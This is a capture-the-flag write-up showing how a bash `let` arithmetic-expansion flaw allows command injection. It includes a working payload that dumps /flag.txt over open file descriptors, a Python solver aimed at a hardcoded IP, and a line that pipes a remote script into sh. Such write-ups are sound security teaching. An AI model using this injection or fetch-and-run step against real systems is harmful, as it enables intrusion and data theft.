# Lottery CTF - Solution Writeup

## Challenge Description
The goal is to guess a 16-character hex winning ticket generated by `md5sum`. The challenge provides a bash script that compares the user's hex guess against the generated ticket.

## Vulnerability: Bash `let` Command Injection
The script uses the `let` command to parse the user's hex guess.

```bash
if [[ "$guess" =~ ^[0-9a-fA-F]+ ]]; then
    let "g = 0x$guess" 2>/dev/null
```

The regex `^[0-9a-fA-F]+` only ensures that the input *starts* with a hex digit. However, the `let` command in bash performs arithmetic expansion on its arguments. This expansion includes the execution of command substitutions `$(...)`. By appending a subshell after a valid hex digit, we can execute arbitrary bash commands.

## Exploitation Plan
The script redirects stderr to `/dev/null` (`2>/dev/null`), making it difficult to see command output directly. To retrieve the flag, we use a **File Descriptor Broadcast** attack. By iterating through potential file descriptors (like FD 3-10, which often correspond to the network socket in CTF jails), we can `cat` the flag directly back to the socket.

### Payload Expression
The constructed expression ensures the broadcast happens during the `let` evaluation:
- `0, a[$(for i in {3..10}; do cat /flag.txt >&$i 2>/dev/null; done; echo 0)]=0`

1.  `0,` passes the initial regex check.
2.  `a[...]` is an array index access which triggers arithmetic evaluation.
3.  `$(...)` executes the broadcast loop, sending the flag to the open socket.

## Solver Script
The following script solves the Proof-of-Work and leverages the `let` injection to retrieve the flag.

```python
import socket
import subprocess
import re

def solve_pow(token):
    cmd = f'bash -c "curl -sSfL https://pwn.red/pow | sh -s {token}"'
    result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

def solve():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("35.245.30.212", 5000))
    s.settimeout(10)
    
    # Read until PoW token
    data = ""
    while "sh -s " not in data:
        data += s.recv(1024).decode()
    
    token = re.search(r"sh -s (\S+)", data).group(1)
    solution = solve_pow(token)
    s.send((solution + "\n").encode())
    
    # Wait for prompt
    resp = ""
    while "winning ticket" not in resp:
        resp += s.recv(1024).decode()
    
    # Exploit: FD broadcast injection
    cmd = 'for i in {3..10}; do cat /flag.txt >&$i 2>/dev/null; done; echo 0'
    guess = f"0, a[$({cmd})]=0\n"
    s.send(guess.encode())
    
    # Read the broadcasted flag
    print(s.recv(4096).decode(errors="ignore"))
    s.close()

if __name__ == "__main__":
    solve()
```

## Flag
**uoftctf{you_won_the_LETtery_(hahahaha_get_it???)}**
